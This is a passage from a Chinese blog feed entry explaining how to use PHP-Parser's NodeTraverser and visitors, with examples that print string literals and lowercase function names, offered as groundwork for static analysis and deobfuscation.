traversation</h2><p>我们使用PHP-Parser对文件的节点进行修改，最关键的就是编写节点遍历操作</p><p>使用<code>PhpParser\NodeTraverser</code>我们可以遍历每一个节点，举几个简单的例子：解析php中的所有字符串，并输出</p><pre><code class="PHP">&lt;?phpuse PhpParser\Error;use PhpParser\ParserFactory;use PhpParser\NodeTraverser;use PhpParser\NodeVisitorAbstract;use PhpParser\Node;require 'vendor/autoload.php';class MyVisitor extends NodeVisitorAbstract{    public function leaveNode(Node $node)    {        //判断如果是一个String_节点，就输出        if ($node instanceof Node\Scalar\String_)        {            echo $node -&gt; value,"\n";        }    }}$code = file_get_contents("./test.php");//实例化解释器$parser = (new ParserFactory)-&gt;create(ParserFactory::PREFER_PHP7);$traverser = New NodeTraverser;//添加自己的Visitor$traverser-&gt;addVisitor(new MyVisitor);try {    //转化AST    $ast = $parser-&gt;parse($code);    //开始遍历    $stmts = $traverser-&gt;traverse($ast);} catch (Error $error) {    echo "Parse error: {$error-&gt;getMessage()}\n";    return;}?&gt;</code></pre><p>替换php脚本中函数以及类的成员方法函数名为小写</p><pre><code class="PHP">class MyVisitor extends NodeVisitorAbstract{    public function leaveNode(Node $node)    {        if( $node instanceof Node\Expr\FuncCall) {            $node-&gt;name-&gt;parts[0]=strtolower($node-&gt;name-&gt;parts[0]);        }elseif($node instanceof Node\Stmt\ClassMethod){            $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name);        }elseif ($node instanceof Node\Stmt\Function_){            $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name);        }elseif($node instanceof Node\Expr\MethodCall){            $node-&gt;name-&gt;name=strtolower($node-&gt;name-&gt;name);        }    }}</code></pre><p>需要注意的是所有的<code>visitors</code>都必须实现<code>PhpParser\NodeVisitor</code>接口，该接口定义了如下4个方法：</p><pre><code class="PHP">public function beforeTraverse(array $nodes);public function enterNode(\PhpParser\Node $node);public function leaveNode(\PhpParser\Node $node);public function afterTraverse(array $nodes);</code></pre><ul><li><p><code>beforeTraverse</code>方法在遍历开始之前调用一次，并将其传递给调用遍历器的节点。此方法可用于在遍历之前重置值或准备遍历树。</p></li><li><p><code>afterTraverse</code>方法与<code>beforeTraverse</code>方法类似，唯一的区别是它只在遍历之后调用一次。</p></li><li><p>在每个节点上都调用<code>enterNode</code>和<code>leaveNode</code>方法，前者在它被输入时，即在它的子节点被遍历之前，后者在它被离开时。</p></li><li><p>这四个方法要么返回更改的节点，要么根本不返回(即null)，在这种情况下，当前节点不更改。</p></li></ul><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p><a href="http://j0k3r.top/2020/03/24/php-Deobfuscator/#0x01-php-parser">基于 AST（抽象语法树）解 PHP 混淆 | J0k3r’s Blog</a></p><h2 id="P-S"><a href="#P-S" class="headerlink" title="P.S."></a>P.S.</h2><p>我们需要知道你需要什么样的Node，进行什么样的操作，Node下数据的格式会有哪几种情况，会不会因为代码不够严谨导致错误或者无限递归</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;PHP-Parser&quot;&gt;&lt;a href=&quot;#PHP-Parser&quot; class=&quot;headerlink&quot; title=&quot;PHP-Parser&quot;&gt;&lt;/a&gt;PHP-Parser&lt;/h1&gt;&lt;p&gt;PHP-Parser组件的基础使用，该组件为静态分析和反混淆常用的第三方依赖。&lt;/p&gt;</summary>
    
    
    
    
    <category term="PHP-Parser" scheme="https://rainsec.cn/tags/PHP-Parser/"/>
    
    <category term="PHP" scheme="https://rainsec.cn/tags/PHP/"/>
    
  </entry>
  
</feed>
